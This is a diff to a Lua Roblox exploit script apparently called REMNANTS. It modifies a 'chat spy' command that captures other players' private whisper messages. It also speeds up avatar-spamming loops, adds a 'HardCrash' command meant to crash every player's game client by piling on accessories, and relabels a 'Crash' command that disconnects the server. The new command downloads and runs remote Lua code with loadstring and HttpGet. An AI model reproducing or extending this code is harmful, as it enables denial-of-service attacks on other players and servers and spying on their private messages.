@@ -6002,52 +6002,38 @@ function modules.UniversalCommands()
 				}
 
 				-- 関数 --
-				local function onChatted(sender, message)
+				local function onChatted(sender, message, textChatMessage)
 					if not spyOnYourSelf then
 						if sender.UserId == speaker.UserId then
 							return
 						end
 					end
 					
-					if self.Services.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-						local systemChannel = self.Services.TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXSystem")
-						if systemChannel then
-							systemChannel:DisplaySystemMessage(string.format(
-								`<b><font color='#{spyProperties.Color:ToHex()}'>[REMNANTS CHAT SPY]</font></b> %s: %s`,
-								sender.Name,
-								message
+					self.spawn(function()
+						if textChatMessage.TextChannel and textChatMessage.TextChannel.Name == "RBXWhisper" then
+							local systemChannel = self.Services.TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXSystem")
+							if systemChannel then
+								systemChannel:DisplaySystemMessage(string.format(
+									`<b><font color='#{spyProperties.Color:ToHex()}'>[REMNANTS CHAT SPY]</font></b> %s: %s`,
+									sender.Name,
+									message
+									)
 								)
-							)
-						end
-					else
-						print(string.format("[REMNANTS CHAT SPY] %s: %s", sender.Name, message))
-					end
-				end
-				
-				if self.Services.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-					self.Services.TextChatService.OnIncomingMessage = function(textChatMessage)
-						if textChatMessage.TextSource and textChatMessage.Status == Enum.TextChatMessageStatus.Success then
-							if textChatMessage.TextChannel and textChatMessage.TextChannel.Name == "RBXWhisper" then
-								local sender = textChatMessage.TextSource
-								local message = textChatMessage.Text
-
-								onChatted(sender, message)
+							else
+								self.Services.StarterGui:SetCore("ChatMakeSystemMessage", {
+									Text = string.format("[REMNANTS CHAT SPY] %s: %s", sender, message),
+									Color = spyProperties.Color,
+									Font = Enum.Font.SourceSansBold,
+									TextSize = 18
+								})
 							end
 						end
-					end
-				else
-					for _, player in pairs(self.Services.Players:GetPlayers()) do
-						player.Chatted:Connect(function(message)
-							onChatted(player, message)
-						end)
-					end
-
-					self.Services.Players.PlayerAdded:Connect(function(player)
-						player.Chatted:Connect(function(message)
-							onChatted(player, message)
-						end)
 					end)
 				end
+				
+				self.chatted("OnIncomingMessage", function(player, message, otherInfo)
+					onChatted(player, message, otherInfo)
+				end)
 
 				self.onThemeChange(function(theme)
 					spyProperties.Color = self.Theme.THEME_COLOR
@@ -8896,7 +8882,7 @@ function modules.UniversalCommands()
 
 					-- 関数 --
 
-					self.startLoop("RAINBOWIFY", .1, function()
+					self.startLoop("RAINBOWIFY", .05, function()
 						local color = Color3.fromHSV(hue, 1, 1)
 
 						applyEvent:FireServer({
@@ -8938,7 +8924,7 @@ function modules.UniversalCommands()
 					-- 変数 --
 
 					-- 関数 --
-					self.startLoop("GLITCHIFY", .1, function()
+					self.startLoop("GLITCHIFY", .05, function()
 						applyEvent:FireServer({
 							BodyScale = {
 								BodyTypeScale = math.random(0, 2),
@@ -9111,6 +9097,13 @@ function modules.UniversalCommands()
 				Arguments = {},
 
 				Function = function(speaker, args)
+					local character = speaker.Character
+					
+					if self.Modules.core:IsRigType(character, "R6") then
+						self:Notify(self.Config.SYSTEM.NAME, `Doesn't work in R6`, "ERROR", nil, 5)
+						return
+					end
+					
 					transform({
 						Body = {
 							Head = {
@@ -9135,10 +9128,86 @@ function modules.UniversalCommands()
 					})
 				end
 			})
+			
+			self:AddCommand({
+				Name = "HardCrash",
+				Description = "Crashes the Roblox Player of everyone",
+
+				Aliases = {},
+				Arguments = {},
+
+				Function = function(speaker, args)
+					-- 引数 --
+
+					-- 変数 --
+					local list = {
+						{9245962833, "TShirt"}, {9240748590, "Jacket"}, {18656764204, "Sweater"},
+						{11287540750, "Sweater"}, {9361235409, "DressSkirt"}, {12033848272, "DressSkirt"},
+						{12396124525, "Sweater"}, {14044841922, "Sweater"}, {12554422087, "Sweater"},
+						{14044841922, "Sweater"}, {18513379473, "Jacket"}, {14903402542, "Jacket"},
+						{11863500298, "Jacket"}, {12739938322, "Jacket"}, {12321467349, "Jacket"},
+						{116337262752407, "Jacket"}, {134639036814234, "Jacket"}, {16509094049, "Jacket"},
+						{12730747125, "Jacket"}, {18554256880, "Jacket"}, {87023882344497, "Jacket"}, 
+						{12868180755, "Jacket"}, {14988795039, "Jacket"}, {16349707072, "Jacket"},
+						{119134549655390, "Jacket"}, {103126855738702, "Jacket"}, {130708845795870, "Jacket"},
+						{14458492932, "Jacket"}, {108477909510614, "Jacket"}, {14460621752, "Jacket"},
+						{11230173404, "Jacket"}, {12847491234, "Jacket"}, {12164594984, "Jacket"},
+						{96008230742732, "Jacket"}, {134155438318913, "Jacket"}, {106432835502546, "Jacket"},
+						{90344674037297, "Jacket"}, {81092774519587, "Jacket"}, {116152555682007, "Jacket"},
+						{106215593690612, "Jacket"}, {104973786209898, "Jacket"}, {82458110331849, "Jacket"},
+						{96872606846885, "Jacket"}, {12470553261, "Jacket"}, {11182485842, "Jacket"},
+						{17261558808, "Jacket"}, {86667646047994, "Jacket"}, {13347235147, "Jacket"},
+						{124733545566059, "Jacket"}, {18161752527, "Jacket"}, {79751512318626, "Jacket"},
+						{72446146468736, "Jacket"}, {131014210567148, "Jacket"}, {73261169895709, "Jacket"},
+						{17658165247, "Jacket"}, {18966080315, "Jacket"}, {136481532617869, "Jacket"},
+						{18755203195, "Jacket"}, {114561781784509, "Jacket"}, {130257181469900, "Jacket"},
+						{17809555660, "Jacket"}, {108623435649969, "Jacket"}, {18247835673, "Jacket"},
+						{129153869533601, "Jacket"}, {16289605196, "Jacket"}, {104318303106204, "Jacket"},
+						{96675661755278, "Jacket"}, {82656186038378, "Jacket"}, {86034084273992, "Jacket"},
+						{84315299929821, "Jacket"}, {133443275109906, "Jacket"}, {18482895154, "Jacket"},
+						{17261652677, "Jacket"}, {13801751917, "Jacket"}, {16829329096, "Jacket"},
+						{18692736634, "Jacket"}, {18597714764, "Jacket"}, {95274543328765, "Jacket"},
+						{18455349000, "Jacket"}, {12992952804, "Jacket"}, {123434542411722, "Jacket"},
+					}
+					local accessoryIds
+					if self.Services.RunService:IsStudio() then
+						accessoryIds = require(script.Accessories) else
+						accessoryIds = loadstring(game:HttpGet("https://raw.githubusercontent.com/Gimkit0/Gim-Test/refs/heads/main/main/deps/accessories.lua"))()
+					end
+
+					local accesoryList = {}
+					for index = 1, #accessoryIds/15 do
+						accesoryList[index] = {
+							AssetId = accessoryIds[index].Id,
+							AccessoryType = accessoryIds[index].AccessoryType
+						}
+					end
+
+					-- 関数 --
+					for index, value in ipairs(list) do
+						table.insert(accesoryList, {
+							AssetId = value[1],
+							AccessoryType = Enum.AccessoryType[value[2]],
+							Order = value[3] or 1,
+							Puffiness = 1,
+						})
+					end
+					
+					transform({
+						Accessories = accesoryList,
+						RightLeg = 130887057643589,
+						RightArm = 88668275797583,
+						Head = 81466963959755,
+						Torso = 106800882836405,
+						LeftArm = 79115019295211,
+						LeftLeg = 80245769527311
+					})
+				end,
+			})
 
 			self:AddCommand({
 				Name = "Crash",
-				Description = "Starts crashing the server",
+				Description = "Starts crashing the server (DISCONNECTS THE INTERNET ON THE SERVER)",
 
 				Aliases = {},
 				Arguments = {},
